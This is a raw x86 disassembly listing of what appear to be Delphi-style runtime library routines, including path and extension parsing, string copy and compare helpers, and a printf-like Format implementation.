  40508c:	8b c3                	mov    %ebx,%eax
  40508e:	e8 51 e3 ff ff       	call   0x4033e4
  405093:	eb 07                	jmp    0x40509c
  405095:	8b c5                	mov    %ebp,%eax
  405097:	e8 44 e0 ff ff       	call   0x4030e0
  40509c:	5d                   	pop    %ebp
  40509d:	5f                   	pop    %edi
  40509e:	5e                   	pop    %esi
  40509f:	5b                   	pop    %ebx
  4050a0:	c3                   	ret
  4050a1:	8d 40 00             	lea    0x0(%eax),%eax
  4050a4:	53                   	push   %ebx
  4050a5:	56                   	push   %esi
  4050a6:	57                   	push   %edi
  4050a7:	8b fa                	mov    %edx,%edi
  4050a9:	8b f0                	mov    %eax,%esi
  4050ab:	8b c6                	mov    %esi,%eax
  4050ad:	e8 a2 e1 ff ff       	call   0x403254
  4050b2:	8b d8                	mov    %eax,%ebx
  4050b4:	eb 01                	jmp    0x4050b7
  4050b6:	4b                   	dec    %ebx
  4050b7:	85 db                	test   %ebx,%ebx
  4050b9:	7e 0c                	jle    0x4050c7
  4050bb:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  4050bf:	2c 3a                	sub    $0x3a,%al
  4050c1:	74 04                	je     0x4050c7
  4050c3:	2c 22                	sub    $0x22,%al
  4050c5:	75 ef                	jne    0x4050b6
  4050c7:	57                   	push   %edi
  4050c8:	8d 53 01             	lea    0x1(%ebx),%edx
  4050cb:	b9 ff 00 00 00       	mov    $0xff,%ecx
  4050d0:	8b c6                	mov    %esi,%eax
  4050d2:	e8 0d e3 ff ff       	call   0x4033e4
  4050d7:	5f                   	pop    %edi
  4050d8:	5e                   	pop    %esi
  4050d9:	5b                   	pop    %ebx
  4050da:	c3                   	ret
  4050db:	90                   	nop
  4050dc:	53                   	push   %ebx
  4050dd:	56                   	push   %esi
  4050de:	57                   	push   %edi
  4050df:	8b fa                	mov    %edx,%edi
  4050e1:	8b f0                	mov    %eax,%esi
  4050e3:	8b c6                	mov    %esi,%eax
  4050e5:	e8 6a e1 ff ff       	call   0x403254
  4050ea:	8b d8                	mov    %eax,%ebx
  4050ec:	eb 01                	jmp    0x4050ef
  4050ee:	4b                   	dec    %ebx
  4050ef:	85 db                	test   %ebx,%ebx
  4050f1:	7e 10                	jle    0x405103
  4050f3:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  4050f7:	2c 2e                	sub    $0x2e,%al
  4050f9:	74 08                	je     0x405103
  4050fb:	2c 0c                	sub    $0xc,%al
  4050fd:	74 04                	je     0x405103
  4050ff:	2c 22                	sub    $0x22,%al
  405101:	75 eb                	jne    0x4050ee
  405103:	85 db                	test   %ebx,%ebx
  405105:	7e 18                	jle    0x40511f
  405107:	80 7c 1e ff 2e       	cmpb   $0x2e,-0x1(%esi,%ebx,1)
  40510c:	75 11                	jne    0x40511f
  40510e:	57                   	push   %edi
  40510f:	b9 ff 00 00 00       	mov    $0xff,%ecx
  405114:	8b d3                	mov    %ebx,%edx
  405116:	8b c6                	mov    %esi,%eax
  405118:	e8 c7 e2 ff ff       	call   0x4033e4
  40511d:	eb 07                	jmp    0x405126
  40511f:	8b c7                	mov    %edi,%eax
  405121:	e8 ba df ff ff       	call   0x4030e0
  405126:	5f                   	pop    %edi
  405127:	5e                   	pop    %esi
  405128:	5b                   	pop    %ebx
  405129:	c3                   	ret
  40512a:	8b c0                	mov    %eax,%eax
  40512c:	89 fa                	mov    %edi,%edx
  40512e:	89 c7                	mov    %eax,%edi
  405130:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  405135:	30 c0                	xor    %al,%al
  405137:	f2 ae                	repnz scas %es:(%edi),%al
  405139:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  40513e:	29 c8                	sub    %ecx,%eax
  405140:	89 d7                	mov    %edx,%edi
  405142:	c3                   	ret
  405143:	90                   	nop
  405144:	56                   	push   %esi
  405145:	57                   	push   %edi
  405146:	89 d6                	mov    %edx,%esi
  405148:	89 c7                	mov    %eax,%edi
  40514a:	89 ca                	mov    %ecx,%edx
  40514c:	39 f7                	cmp    %esi,%edi
  40514e:	7f 11                	jg     0x405161
  405150:	74 2b                	je     0x40517d
  405152:	c1 e9 02             	shr    $0x2,%ecx
  405155:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405157:	89 d1                	mov    %edx,%ecx
  405159:	83 e1 03             	and    $0x3,%ecx
  40515c:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40515e:	5f                   	pop    %edi
  40515f:	5e                   	pop    %esi
  405160:	c3                   	ret
  405161:	8d 74 0e ff          	lea    -0x1(%esi,%ecx,1),%esi
  405165:	8d 7c 0f ff          	lea    -0x1(%edi,%ecx,1),%edi
  405169:	83 e1 03             	and    $0x3,%ecx
  40516c:	fd                   	std
  40516d:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40516f:	83 ee 03             	sub    $0x3,%esi
  405172:	83 ef 03             	sub    $0x3,%edi
  405175:	89 d1                	mov    %edx,%ecx
  405177:	c1 e9 02             	shr    $0x2,%ecx
  40517a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40517c:	fc                   	cld
  40517d:	5f                   	pop    %edi
  40517e:	5e                   	pop    %esi
  40517f:	c3                   	ret
  405180:	57                   	push   %edi
  405181:	56                   	push   %esi
  405182:	53                   	push   %ebx
  405183:	89 c6                	mov    %eax,%esi
  405185:	89 d7                	mov    %edx,%edi
  405187:	89 cb                	mov    %ecx,%ebx
  405189:	30 c0                	xor    %al,%al
  40518b:	85 c9                	test   %ecx,%ecx
  40518d:	74 05                	je     0x405194
  40518f:	f2 ae                	repnz scas %es:(%edi),%al
  405191:	75 01                	jne    0x405194
  405193:	41                   	inc    %ecx
  405194:	29 cb                	sub    %ecx,%ebx
  405196:	89 f7                	mov    %esi,%edi
  405198:	89 d6                	mov    %edx,%esi
  40519a:	89 fa                	mov    %edi,%edx
  40519c:	89 d9                	mov    %ebx,%ecx
  40519e:	c1 e9 02             	shr    $0x2,%ecx
  4051a1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4051a3:	89 d9                	mov    %ebx,%ecx
  4051a5:	83 e1 03             	and    $0x3,%ecx
  4051a8:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4051aa:	aa                   	stos   %al,%es:(%edi)
  4051ab:	89 d0                	mov    %edx,%eax
  4051ad:	5b                   	pop    %ebx
  4051ae:	5e                   	pop    %esi
  4051af:	5f                   	pop    %edi
  4051b0:	c3                   	ret
  4051b1:	8d 40 00             	lea    0x0(%eax),%eax
  4051b4:	57                   	push   %edi
  4051b5:	56                   	push   %esi
  4051b6:	53                   	push   %ebx
  4051b7:	89 d7                	mov    %edx,%edi
  4051b9:	89 c6                	mov    %eax,%esi
  4051bb:	89 cb                	mov    %ecx,%ebx
  4051bd:	31 c0                	xor    %eax,%eax
  4051bf:	09 c9                	or     %ecx,%ecx
  4051c1:	74 32                	je     0x4051f5
  4051c3:	f2 ae                	repnz scas %es:(%edi),%al
  4051c5:	29 cb                	sub    %ecx,%ebx
  4051c7:	89 d9                	mov    %ebx,%ecx
  4051c9:	89 d7                	mov    %edx,%edi
  4051cb:	31 d2                	xor    %edx,%edx
  4051cd:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4051cf:	74 24                	je     0x4051f5
  4051d1:	8a 46 ff             	mov    -0x1(%esi),%al
  4051d4:	80 f8 61             	cmp    $0x61,%al
  4051d7:	72 08                	jb     0x4051e1
  4051d9:	80 f8 7a             	cmp    $0x7a,%al
  4051dc:	77 03                	ja     0x4051e1
  4051de:	80 e8 20             	sub    $0x20,%al
  4051e1:	8a 57 ff             	mov    -0x1(%edi),%dl
  4051e4:	80 fa 61             	cmp    $0x61,%dl
  4051e7:	72 08                	jb     0x4051f1
  4051e9:	80 fa 7a             	cmp    $0x7a,%dl
  4051ec:	77 03                	ja     0x4051f1
  4051ee:	80 ea 20             	sub    $0x20,%dl
  4051f1:	29 d0                	sub    %edx,%eax
  4051f3:	74 d8                	je     0x4051cd
  4051f5:	5b                   	pop    %ebx
  4051f6:	5e                   	pop    %esi
  4051f7:	5f                   	pop    %edi
  4051f8:	c3                   	ret
  4051f9:	8d 40 00             	lea    0x0(%eax),%eax
  4051fc:	57                   	push   %edi
  4051fd:	89 c7                	mov    %eax,%edi
  4051ff:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  405204:	30 c0                	xor    %al,%al
  405206:	f2 ae                	repnz scas %es:(%edi),%al
  405208:	f7 d1                	not    %ecx
  40520a:	fd                   	std
  40520b:	4f                   	dec    %edi
  40520c:	88 d0                	mov    %dl,%al
  40520e:	f2 ae                	repnz scas %es:(%edi),%al
  405210:	b8 00 00 00 00       	mov    $0x0,%eax
  405215:	75 03                	jne    0x40521a
  405217:	89 f8                	mov    %edi,%eax
  405219:	40                   	inc    %eax
  40521a:	fc                   	cld
  40521b:	5f                   	pop    %edi
  40521c:	c3                   	ret
  40521d:	8d 40 00             	lea    0x0(%eax),%eax
  405220:	53                   	push   %ebx
  405221:	8b d8                	mov    %eax,%ebx
  405223:	83 c3 04             	add    $0x4,%ebx
  405226:	8b c3                	mov    %ebx,%eax
  405228:	e8 67 d3 ff ff       	call   0x402594
  40522d:	89 18                	mov    %ebx,(%eax)
  40522f:	83 c0 04             	add    $0x4,%eax
  405232:	5b                   	pop    %ebx
  405233:	c3                   	ret
  405234:	53                   	push   %ebx
  405235:	56                   	push   %esi
  405236:	8b d8                	mov    %eax,%ebx
  405238:	85 db                	test   %ebx,%ebx
  40523a:	75 05                	jne    0x405241
  40523c:	33 c0                	xor    %eax,%eax
  40523e:	5e                   	pop    %esi
  40523f:	5b                   	pop    %ebx
  405240:	c3                   	ret
  405241:	8b c3                	mov    %ebx,%eax
  405243:	e8 e4 fe ff ff       	call   0x40512c
  405248:	8b f0                	mov    %eax,%esi
  40524a:	46                   	inc    %esi
  40524b:	8b c6                	mov    %esi,%eax
  40524d:	e8 ce ff ff ff       	call   0x405220
  405252:	8b ce                	mov    %esi,%ecx
  405254:	8b d3                	mov    %ebx,%edx
  405256:	e8 e9 fe ff ff       	call   0x405144
  40525b:	5e                   	pop    %esi
  40525c:	5b                   	pop    %ebx
  40525d:	c3                   	ret
  40525e:	8b c0                	mov    %eax,%eax
  405260:	53                   	push   %ebx
  405261:	56                   	push   %esi
  405262:	83 c4 d8             	add    $0xffffffd8,%esp
  405265:	8b d9                	mov    %ecx,%ebx
  405267:	8b f0                	mov    %eax,%esi
  405269:	83 fb 1f             	cmp    $0x1f,%ebx
  40526c:	7e 05                	jle    0x405273
  40526e:	bb 1f 00 00 00       	mov    $0x1f,%ebx
  405273:	8b c4                	mov    %esp,%eax
  405275:	8b cb                	mov    %ebx,%ecx
  405277:	e8 c8 fe ff ff       	call   0x405144
  40527c:	c6 04 1c 00          	movb   $0x0,(%esp,%ebx,1)
  405280:	8b c4                	mov    %esp,%eax
  405282:	89 44 24 20          	mov    %eax,0x20(%esp)
  405286:	c6 44 24 24 06       	movb   $0x6,0x24(%esp)
  40528b:	8d 54 24 20          	lea    0x20(%esp),%edx
  40528f:	8d 86 a0 ff 00 00    	lea    0xffa0(%esi),%eax
  405295:	33 c9                	xor    %ecx,%ecx
  405297:	e8 e4 f9 ff ff       	call   0x404c80
  40529c:	83 c4 28             	add    $0x28,%esp
  40529f:	5e                   	pop    %esi
  4052a0:	5b                   	pop    %ebx
  4052a1:	c3                   	ret
  4052a2:	8b c0                	mov    %eax,%eax
  4052a4:	53                   	push   %ebx
  4052a5:	56                   	push   %esi
  4052a6:	8b f2                	mov    %edx,%esi
  4052a8:	8b d8                	mov    %eax,%ebx
  4052aa:	8b c3                	mov    %ebx,%eax
  4052ac:	8b d6                	mov    %esi,%edx
  4052ae:	e8 5d e7 ff ff       	call   0x403a10
  4052b3:	5e                   	pop    %esi
  4052b4:	5b                   	pop    %ebx
  4052b5:	c3                   	ret
  4052b6:	8b c0                	mov    %eax,%eax
  4052b8:	53                   	push   %ebx
  4052b9:	8b d8                	mov    %eax,%ebx
  4052bb:	8b c3                	mov    %ebx,%eax
  4052bd:	e8 1e de ff ff       	call   0x4030e0
  4052c2:	5b                   	pop    %ebx
  4052c3:	c3                   	ret
  4052c4:	55                   	push   %ebp
  4052c5:	8b ec                	mov    %esp,%ebp
  4052c7:	83 c4 b8             	add    $0xffffffb8,%esp
  4052ca:	53                   	push   %ebx
  4052cb:	56                   	push   %esi
  4052cc:	57                   	push   %edi
  4052cd:	89 c7                	mov    %eax,%edi
  4052cf:	89 ce                	mov    %ecx,%esi
  4052d1:	03 4d 10             	add    0x10(%ebp),%ecx
  4052d4:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4052d7:	31 c0                	xor    %eax,%eax
  4052d9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4052dc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4052df:	09 d2                	or     %edx,%edx
  4052e1:	74 0e                	je     0x4052f1
  4052e3:	39 ce                	cmp    %ecx,%esi
  4052e5:	74 0a                	je     0x4052f1
  4052e7:	ac                   	lods   %ds:(%esi),%al
  4052e8:	80 f8 25             	cmp    $0x25,%al
  4052eb:	74 0e                	je     0x4052fb
  4052ed:	aa                   	stos   %al,%es:(%edi)
  4052ee:	4a                   	dec    %edx
  4052ef:	75 f2                	jne    0x4052e3
  4052f1:	89 f8                	mov    %edi,%eax
  4052f3:	2b 45 fc             	sub    -0x4(%ebp),%eax
  4052f6:	e9 c5 02 00 00       	jmp    0x4055c0
  4052fb:	39 ce                	cmp    %ecx,%esi
  4052fd:	74 f2                	je     0x4052f1
  4052ff:	ac                   	lods   %ds:(%esi),%al
  405300:	80 f8 25             	cmp    $0x25,%al
  405303:	74 e8                	je     0x4052ed
  405305:	8d 5e fe             	lea    -0x2(%esi),%ebx
  405308:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40530b:	88 45 ef             	mov    %al,-0x11(%ebp)
  40530e:	80 f8 2d             	cmp    $0x2d,%al
  405311:	75 05                	jne    0x405318
  405313:	39 ce                	cmp    %ecx,%esi
  405315:	74 da                	je     0x4052f1
  405317:	ac                   	lods   %ds:(%esi),%al
  405318:	e8 80 00 00 00       	call   0x40539d
  40531d:	80 f8 3a             	cmp    $0x3a,%al
  405320:	75 0a                	jne    0x40532c
  405322:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  405325:	39 ce                	cmp    %ecx,%esi
  405327:	74 c8                	je     0x4052f1
  405329:	ac                   	lods   %ds:(%esi),%al
  40532a:	eb df                	jmp    0x40530b
  40532c:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  40532f:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
  405334:	80 f8 2e             	cmp    $0x2e,%al
  405337:	75 0a                	jne    0x405343
  405339:	39 ce                	cmp    %ecx,%esi
  40533b:	74 b4                	je     0x4052f1
  40533d:	ac                   	lods   %ds:(%esi),%al
  40533e:	e8 5a 00 00 00       	call   0x40539d
  405343:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  405346:	89 75 e0             	mov    %esi,-0x20(%ebp)
  405349:	51                   	push   %ecx
  40534a:	52                   	push   %edx
  40534b:	e8 96 00 00 00       	call   0x4053e6
  405350:	5a                   	pop    %edx
  405351:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  405354:	29 cb                	sub    %ecx,%ebx
  405356:	73 02                	jae    0x40535a
  405358:	31 db                	xor    %ebx,%ebx
  40535a:	80 7d ef 2d          	cmpb   $0x2d,-0x11(%ebp)
  40535e:	75 0a                	jne    0x40536a
  405360:	29 ca                	sub    %ecx,%edx
  405362:	73 04                	jae    0x405368
  405364:	01 d1                	add    %edx,%ecx
  405366:	31 d2                	xor    %edx,%edx
  405368:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40536a:	87 cb                	xchg   %ecx,%ebx
  40536c:	29 ca                	sub    %ecx,%edx
  40536e:	73 04                	jae    0x405374
  405370:	01 d1                	add    %edx,%ecx
  405372:	31 d2                	xor    %edx,%edx
  405374:	b0 20                	mov    $0x20,%al
  405376:	f3 aa                	rep stos %al,%es:(%edi)
  405378:	87 cb                	xchg   %ecx,%ebx
  40537a:	29 ca                	sub    %ecx,%edx
  40537c:	73 04                	jae    0x405382
  40537e:	01 d1                	add    %edx,%ecx
  405380:	31 d2                	xor    %edx,%edx
  405382:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405384:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  405388:	74 0a                	je     0x405394
  40538a:	52                   	push   %edx
  40538b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40538e:	e8 25 ff ff ff       	call   0x4052b8
  405393:	5a                   	pop    %edx
  405394:	59                   	pop    %ecx
  405395:	8b 75 e0             	mov    -0x20(%ebp),%esi
  405398:	e9 42 ff ff ff       	jmp    0x4052df
  40539d:	31 db                	xor    %ebx,%ebx
  40539f:	80 f8 2a             	cmp    $0x2a,%al
  4053a2:	74 22                	je     0x4053c6
  4053a4:	80 f8 30             	cmp    $0x30,%al
  4053a7:	72 3c                	jb     0x4053e5
  4053a9:	80 f8 39             	cmp    $0x39,%al
  4053ac:	77 37                	ja     0x4053e5
  4053ae:	6b db 0a             	imul   $0xa,%ebx,%ebx
  4053b1:	80 e8 30             	sub    $0x30,%al
  4053b4:	0f b6 c0             	movzbl %al,%eax
  4053b7:	01 c3                	add    %eax,%ebx
  4053b9:	39 ce                	cmp    %ecx,%esi
  4053bb:	74 03                	je     0x4053c0
  4053bd:	ac                   	lods   %ds:(%esi),%al
  4053be:	eb e4                	jmp    0x4053a4
  4053c0:	58                   	pop    %eax
  4053c1:	e9 2b ff ff ff       	jmp    0x4052f1
  4053c6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4053c9:	3b 45 08             	cmp    0x8(%ebp),%eax
  4053cc:	77 12                	ja     0x4053e0
  4053ce:	ff 45 f8             	incl   -0x8(%ebp)
  4053d1:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4053d4:	80 7c c3 04 00       	cmpb   $0x0,0x4(%ebx,%eax,8)
  4053d9:	8b 1c c3             	mov    (%ebx,%eax,8),%ebx
  4053dc:	74 02                	je     0x4053e0
  4053de:	31 db                	xor    %ebx,%ebx
  4053e0:	39 ce                	cmp    %ecx,%esi
  4053e2:	74 dc                	je     0x4053c0
  4053e4:	ac                   	lods   %ds:(%esi),%al
  4053e5:	c3                   	ret
  4053e6:	24 df                	and    $0xdf,%al
  4053e8:	88 c1                	mov    %al,%cl
  4053ea:	b8 01 00 00 00       	mov    $0x1,%eax
  4053ef:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4053f2:	3b 5d 08             	cmp    0x8(%ebp),%ebx
  4053f5:	77 50                	ja     0x405447
  4053f7:	ff 45 f8             	incl   -0x8(%ebp)
  4053fa:	8b 75 0c             	mov    0xc(%ebp),%esi
  4053fd:	8d 34 de             	lea    (%esi,%ebx,8),%esi
  405400:	8b 06                	mov    (%esi),%eax
  405402:	0f b6 5e 04          	movzbl 0x4(%esi),%ebx
  405406:	ff 24 9d 0d 54 40 00 	jmp    *0x40540d(,%ebx,4)
  40540d:	54                   	push   %esp
  40540e:	54                   	push   %esp
  40540f:	40                   	inc    %eax
  405410:	00 45 54             	add    %al,0x54(%ebp)
  405413:	40                   	inc    %eax
  405414:	00 b7 54 40 00 4e    	add    %dh,0x4e004054(%edi)
  40541a:	55                   	push   %ebp
  40541b:	40                   	inc    %eax
  40541c:	00 e3                	add    %ah,%bl
  40541e:	54                   	push   %esp
  40541f:	40                   	inc    %eax
  405420:	00 30                	add    %dh,(%eax)
  405422:	55                   	push   %ebp
  405423:	40                   	inc    %eax
  405424:	00 10                	add    %dl,(%eax)
  405426:	55                   	push   %ebp
  405427:	40                   	inc    %eax
  405428:	00 45 54             	add    %al,0x54(%ebp)
  40542b:	40                   	inc    %eax
  40542c:	00 45 54             	add    %al,0x54(%ebp)
  40542f:	40                   	inc    %eax
  405430:	00 45 54             	add    %al,0x54(%ebp)
  405433:	40                   	inc    %eax
  405434:	00 45 54             	add    %al,0x54(%ebp)
  405437:	40                   	inc    %eax
  405438:	00 f4                	add    %dh,%ah
  40543a:	54                   	push   %esp
  40543b:	40                   	inc    %eax
  40543c:	00 4a 55             	add    %cl,0x55(%edx)
  40543f:	40                   	inc    %eax
  405440:	00 c2                	add    %al,%dl
  405442:	54                   	push   %esp
  405443:	40                   	inc    %eax
  405444:	00 31                	add    %dh,(%ecx)
  405446:	c0 8b 55 f0 8b 4d e0 	rorb   $0xe0,0x4d8bf055(%ebx)
  40544d:	29 d1                	sub    %edx,%ecx
  40544f:	e8 0c fe ff ff       	call   0x405260
  405454:	80 f9 44             	cmp    $0x44,%cl
  405457:	74 11                	je     0x40546a
  405459:	80 f9 55             	cmp    $0x55,%cl
  40545c:	74 1e                	je     0x40547c
  40545e:	80 f9 58             	cmp    $0x58,%cl
  405461:	75 e2                	jne    0x405445
  405463:	b9 10 00 00 00       	mov    $0x10,%ecx
  405468:	eb 17                	jmp    0x405481
  40546a:	09 c0                	or     %eax,%eax
  40546c:	79 0e                	jns    0x40547c
  40546e:	f7 d8                	neg    %eax
  405470:	e8 07 00 00 00       	call   0x40547c
  405475:	b0 2d                	mov    $0x2d,%al
  405477:	41                   	inc    %ecx
  405478:	4e                   	dec    %esi
  405479:	88 06                	mov    %al,(%esi)
  40547b:	c3                   	ret
  40547c:	b9 0a 00 00 00       	mov    $0xa,%ecx
  405481:	8d 75 c8             	lea    -0x38(%ebp),%esi
  405484:	31 d2                	xor    %edx,%edx
  405486:	f7 f1                	div    %ecx
  405488:	80 c2 30             	add    $0x30,%dl
  40548b:	80 fa 3a             	cmp    $0x3a,%dl
  40548e:	72 03                	jb     0x405493
  405490:	80 c2 07             	add    $0x7,%dl
  405493:	4e                   	dec    %esi
  405494:	88 16                	mov    %dl,(%esi)
  405496:	09 c0                	or     %eax,%eax
  405498:	75 ea                	jne    0x405484
  40549a:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40549d:	29 f1                	sub    %esi,%ecx
  40549f:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4054a2:	83 fa 10             	cmp    $0x10,%edx
  4054a5:	72 01                	jb     0x4054a8
  4054a7:	c3                   	ret
  4054a8:	29 ca                	sub    %ecx,%edx
  4054aa:	76 0a                	jbe    0x4054b6
  4054ac:	01 d1                	add    %edx,%ecx
  4054ae:	b0 30                	mov    $0x30,%al
  4054b0:	4e                   	dec    %esi
  4054b1:	88 06                	mov    %al,(%esi)
  4054b3:	4a                   	dec    %edx
  4054b4:	75 fa                	jne    0x4054b0
  4054b6:	c3                   	ret
  4054b7:	80 f9 53             	cmp    $0x53,%cl
  4054ba:	75 89                	jne    0x405445
  4054bc:	b9 01 00 00 00       	mov    $0x1,%ecx
  4054c1:	c3                   	ret
  4054c2:	80 f9 53             	cmp    $0x53,%cl
  4054c5:	0f 85 7a ff ff ff    	jne    0x405445
  4054cb:	66 83 38 01          	cmpw   $0x1,(%eax)
  4054cf:	76 0f                	jbe    0x4054e0
  4054d1:	89 c2                	mov    %eax,%edx
  4054d3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4054d6:	e8 c9 fd ff ff       	call   0x4052a4
  4054db:	8b 75 f4             	mov    -0xc(%ebp),%esi
  4054de:	eb 1f                	jmp    0x4054ff
  4054e0:	31 c9                	xor    %ecx,%ecx
  4054e2:	c3                   	ret
  4054e3:	80 f9 53             	cmp    $0x53,%cl
  4054e6:	0f 85 59 ff ff ff    	jne    0x405445
  4054ec:	89 c6                	mov    %eax,%esi
  4054ee:	ac                   	lods   %ds:(%esi),%al
  4054ef:	0f b6 c8             	movzbl %al,%ecx
  4054f2:	eb 12                	jmp    0x405506
  4054f4:	80 f9 53             	cmp    $0x53,%cl
  4054f7:	0f 85 48 ff ff ff    	jne    0x405445
  4054fd:	89 c6                	mov    %eax,%esi
  4054ff:	09 f6                	or     %esi,%esi
  405501:	74 dd                	je     0x4054e0
  405503:	8b 4e fc             	mov    -0x4(%esi),%ecx
  405506:	3b 4d e4             	cmp    -0x1c(%ebp),%ecx
  405509:	77 01                	ja     0x40550c
  40550b:	c3                   	ret
  40550c:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40550f:	c3                   	ret
  405510:	80 f9 53             	cmp    $0x53,%cl
  405513:	0f 85 2c ff ff ff    	jne    0x405445
  405519:	89 c6                	mov    %eax,%esi
  40551b:	57                   	push   %edi
  40551c:	89 c7                	mov    %eax,%edi
  40551e:	30 c0                	xor    %al,%al
  405520:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  405523:	e3 05                	jecxz  0x40552a
  405525:	f2 ae                	repnz scas %es:(%edi),%al
  405527:	75 01                	jne    0x40552a
  405529:	4f                   	dec    %edi
  40552a:	89 f9                	mov    %edi,%ecx
  40552c:	29 f1                	sub    %esi,%ecx
  40552e:	5f                   	pop    %edi
  40552f:	c3                   	ret
  405530:	80 f9 50             	cmp    $0x50,%cl
  405533:	0f 85 0c ff ff ff    	jne    0x405445
  405539:	c7 45 e4 08 00 00 00 	movl   $0x8,-0x1c(%ebp)
  405540:	b9 10 00 00 00       	mov    $0x10,%ecx
  405545:	e9 37 ff ff ff       	jmp    0x405481
  40554a:	b7 01                	mov    $0x1,%bh
  40554c:	eb 02                	jmp    0x405550
  40554e:	b7 00                	mov    $0x0,%bh
  405550:	89 c6                	mov    %eax,%esi
  405552:	b3 00                	mov    $0x0,%bl
  405554:	80 f9 47             	cmp    $0x47,%cl
  405557:	74 3f                	je     0x405598
  405559:	b3 01                	mov    $0x1,%bl
  40555b:	80 f9 45             	cmp    $0x45,%cl
  40555e:	74 38                	je     0x405598
  405560:	b3 02                	mov    $0x2,%bl
  405562:	80 f9 46             	cmp    $0x46,%cl
  405565:	74 12                	je     0x405579
  405567:	b3 03                	mov    $0x3,%bl
  405569:	80 f9 4e             	cmp    $0x4e,%cl
  40556c:	74 0b                	je     0x405579
  40556e:	80 f9 4d             	cmp    $0x4d,%cl
  405571:	0f 85 ce fe ff ff    	jne    0x405445
  405577:	b3 04                	mov    $0x4,%bl
  405579:	b8 12 00 00 00       	mov    $0x12,%eax
  40557e:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  405581:	39 c2                	cmp    %eax,%edx
  405583:	76 25                	jbe    0x4055aa
  405585:	ba 02 00 00 00       	mov    $0x2,%edx
  40558a:	80 f9 4d             	cmp    $0x4d,%cl
  40558d:	75 1b                	jne    0x4055aa
  40558f:	0f b6 15 98 c4 40 00 	movzbl 0x40c498,%edx
  405596:	eb 12                	jmp    0x4055aa
  405598:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40559b:	ba 03 00 00 00       	mov    $0x3,%edx
  4055a0:	83 f8 12             	cmp    $0x12,%eax
  4055a3:	76 05                	jbe    0x4055aa
  4055a5:	b8 0f 00 00 00       	mov    $0xf,%eax
  4055aa:	53                   	push   %ebx
  4055ab:	50                   	push   %eax
  4055ac:	52                   	push   %edx
  4055ad:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4055b0:	89 f2                	mov    %esi,%edx
  4055b2:	0f b6 cf             	movzbl %bh,%ecx
  4055b5:	e8 70 16 00 00       	call   0x406c2a
  4055ba:	89 c1                	mov    %eax,%ecx
  4055bc:	8d 75 b8             	lea    -0x48(%ebp),%esi
  4055bf:	c3                   	ret
  4055c0:	5f                   	pop    %edi
  4055c1:	5e                   	pop    %esi
  4055c2:	5b                   	pop    %ebx
  4055c3:	8b e5                	mov    %ebp,%esp
  4055c5:	5d                   	pop    %ebp
  4055c6:	c2 0c 00             	ret    $0xc
  4055c9:	8d 40 00             	lea    0x0(%eax),%eax
  4055cc:	55                   	push   %ebp
  4055cd:	8b ec                	mov    %esp,%ebp
  4055cf:	53                   	push   %ebx
  4055d0:	56                   	push   %esi
  4055d1:	57                   	push   %edi
  4055d2:	8b f9                	mov    %ecx,%edi
  4055d4:	8b f2                	mov    %edx,%esi
  4055d6:	8b d8                	mov    %eax,%ebx
  4055d8:	8b c6                	mov    %esi,%eax
  4055da:	e8 4d fb ff ff       	call   0x40512c
  4055df:	50                   	push   %eax
  4055e0:	57                   	push   %edi
  4055e1:	8b 45 08             	mov    0x8(%ebp),%eax
  4055e4:	50                   	push   %eax
  4055e5:	8b ce                	mov    %esi,%ecx
  4055e7:	8b c3                	mov    %ebx,%eax
  4055e9:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
  4055ee:	e8 d1 fc ff ff       	call   0x4052c4
  4055f3:	c6 04 03 00          	movb   $0x0,(%ebx,%eax,1)
  4055f7:	8b c3                	mov    %ebx,%eax
  4055f9:	5f                   	pop    %edi
  4055fa:	5e                   	pop    %esi
  4055fb:	5b                   	pop    %ebx
  4055fc:	5d                   	pop    %ebp
  4055fd:	c2 04 00             	ret    $0x4
  405600:	55                   	push   %ebp
  405601:	8b ec                	mov    %esp,%ebp
  405603:	51                   	push   %ecx
  405604:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405607:	91                   	xchg   %eax,%ecx
  405608:	87 d1                	xchg   %edx,%ecx
  40560a:	e8 05 00 00 00       	call   0x405614
  40560f:	5d                   	pop    %ebp
  405610:	c2 04 00             	ret    $0x4
  405613:	90                   	nop
  405614:	55                   	push   %ebp
  405615:	8b ec                	mov    %esp,%ebp
  405617:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  40561d:	50                   	push   %eax
  40561e:	83 c4 fc             	add    $0xfffffffc,%esp
  405621:	53                   	push   %ebx
  405622:	56                   	push   %esi
  405623:	57                   	push   %edi
  405624:	8b f9                	mov    %ecx,%edi
  405626:	8b da                	mov    %edx,%ebx
